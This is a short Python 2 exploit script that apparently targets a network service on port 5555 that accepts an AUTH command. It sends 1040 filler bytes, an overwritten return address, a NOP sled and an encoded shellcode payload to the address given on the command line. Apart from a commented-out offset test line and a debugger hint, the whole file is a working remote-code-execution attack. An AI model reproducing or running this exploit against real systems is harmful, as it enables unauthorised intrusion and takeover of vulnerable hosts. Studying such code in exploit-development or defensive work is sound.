#!/usr/bin/python
import time, struct, sys
import socket as so
try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()


shellcode = ("\xdb\xc5\xbb\xbd\x59\xdd\x22\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x58\x17\x83\xc0\x04\x03\xe5\x4a\x3f\xd7\xe9\x85\x3d"
"\x18\x11\x56\x22\x90\xf4\x67\x62\xc6\x7d\xd7\x52\x8c\xd3\xd4"
"\x19\xc0\xc7\x6f\x6f\xcd\xe8\xd8\xda\x2b\xc7\xd9\x77\x0f\x46"
"\x5a\x8a\x5c\xa8\x63\x45\x91\xa9\xa4\xb8\x58\xfb\x7d\xb6\xcf"
"\xeb\x0a\x82\xd3\x80\x41\x02\x54\x75\x11\x25\x75\x28\x29\x7c"
"\x55\xcb\xfe\xf4\xdc\xd3\xe3\x31\x96\x68\xd7\xce\x29\xb8\x29"
"\x2e\x85\x85\x85\xdd\xd7\xc2\x22\x3e\xa2\x3a\x51\xc3\xb5\xf9"
"\x2b\x1f\x33\x19\x8b\xd4\xe3\xc5\x2d\x38\x75\x8e\x22\xf5\xf1"
"\xc8\x26\x08\xd5\x63\x52\x81\xd8\xa3\xd2\xd1\xfe\x67\xbe\x82"
"\x9f\x3e\x1a\x64\x9f\x20\xc5\xd9\x05\x2b\xe8\x0e\x34\x76\x65"
"\xe2\x75\x88\x75\x6c\x0d\xfb\x47\x33\xa5\x93\xeb\xbc\x63\x64"
"\x0b\x97\xd4\xfa\xf2\x18\x25\xd3\x30\x4c\x75\x4b\x90\xed\x1e"
"\x8b\x1d\x38\xb0\xdb\xb1\x93\x71\x8b\x71\x44\x1a\xc1\x7d\xbb"
"\x3a\xea\x57\xd4\xd1\x11\x30\xd1\x2e\x19\x13\x8d\x32\x19\x97"
"\x9c\xba\xff\xfd\x30\xeb\xa8\x69\xa8\xb6\x22\x0b\x35\x6d\x4f"
"\x0b\xbd\x82\xb0\xc2\x36\xee\xa2\xb3\xb6\xa5\x98\x12\xc8\x13"
"\xb4\xf9\x5b\xf8\x44\x77\x40\x57\x13\xd0\xb6\xae\xf1\xcc\xe1"
"\x18\xe7\x0c\x77\x62\xa3\xca\x44\x6d\x2a\x9e\xf1\x49\x3c\x66"
"\xf9\xd5\x68\x36\xac\x83\xc6\xf0\x06\x62\xb0\xaa\xf5\x2c\x54"
"\x2a\x36\xef\x22\x33\x13\x99\xca\x82\xca\xdc\xf5\x2b\x9b\xe8"
"\x8e\x51\x3b\x16\x45\xd2\x4b\x5d\xc7\x73\xc4\x38\x92\xc1\x89"
"\xba\x49\x05\xb4\x38\x7b\xf6\x43\x20\x0e\xf3\x08\xe6\xe3\x89"
"\x01\x83\x03\x3d\x21\x86")

#req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "C" * (1072-1040-4+390)
req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x90" * 8 + shellcode

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()

